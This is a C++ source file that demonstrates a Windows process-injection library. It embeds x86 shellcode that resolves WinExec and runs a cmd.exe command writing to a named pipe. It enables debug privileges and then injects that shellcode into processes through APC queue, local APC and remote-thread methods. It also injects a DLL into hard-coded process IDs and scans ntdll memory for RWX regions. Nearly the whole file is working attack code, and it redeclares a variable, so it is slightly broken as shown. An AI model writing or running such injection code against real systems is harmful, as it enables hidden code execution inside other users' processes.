#include <Windows.h>
#include "ProcessInject.h"
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow){
	//some examples on how to use library
	unsigned char shellcode[] =
		"\x55\x8b\xec\x83\xec\x1c\x33\xc0\x89\x45\xfc\x89\x45\xf8\x89\x45\xf4\x89\x45\xf0\x89\x45\xec\x89\x45\xe8\x89\x45\xe4\x68\x78\x65\x63\x00\x68\x57\x69\x6e\x45\x89\x65\xec\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x8b\xd8\x8b\x43\x3c\x03\xc3\x8b\x40\x78\x03\xc3\x8b\x48\x14\x89\x4d\xfc\x8b\x48\x1c\x03\xcb\x89\x4d\xf8\x8b\x48\x20\x03\xcb\x89\x4d\xf4\x8b\x48\x24\x03\xcb\x89\x4d\xf0\x33\xc0\x33\xc9\x8b\x75\xec\x8b\x7d\xf4\xfc\x8b\x3c\x87\x03\xfb\x66\xb9\x08\x00\xf3\xa6\x74\x06\x40\x3b\x45\xfc\xeb\xe6\x8b\x4d\xf0\x8b\x55\xf8\x66\x8b\x04\x41\x8b\x04\x82\x03\xc3\xeb\x00\x33\xd2\x52\x68\x70\x65\x00\x00\x68\x73\x5f\x70\x69\x68\x5c\x74\x68\x69\x68\x70\x69\x70\x65\x68\x5c\x5c\x2e\x5c\x68\x69\x72\x20\x3e\x68\x2f\x63\x20\x64\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8b\xcc\x6a\x0a\x51\xff\xd0\x83\xc4\x1c\x83\xc4\x2c\x83\xc4\x04\x5d\xc3";
	Inject::SeDbugPrivs();
	DWORD pid = 0;
	DebugBreak();
	Inject::CodeInject code_injection;
	Inject::Memory_Surviliance memserv;
	code_injection.ApcQueInjection(pid, shellcode, sizeof(shellcode));
	code_injection.LocalAPCQueInjection(shellcode, sizeof(shellcode));
	code_injection.RemoteThreadShellcodeInject(pid, shellcode, sizeof(shellcode));

	HANDLE hproc=	Inject::GetHandle(pid);
	memserv.GetProcessBase(hproc);
	DWORD pointers = 0;
	IMAGE_SECTION_HEADER section= memserv.DataSection("ntdll.dll", pointers);
	LPVOID addr = section.VirtualAddress + section.PointerToRawData;
	memserv.IsCodePtr(hproc, addr);
	memserv.IsHeapPtr(addr);
	memserv.IsRWX(addr, TRUE);
	memserv.IsRWX(addr, FALSE);
	DWORD ptr = 0;
	memserv.RemoteDataSection(hproc, ptr);
	HANDLE hproc = Inject::GetHandle(10948);
	LPVOID hw = memserv.GetRemoteModule(10948, L"hw.dll");
	Inject::DllInject dllject;
	dllject.RemoteThreadDllInject(2016, "messagebox.dll");
	
}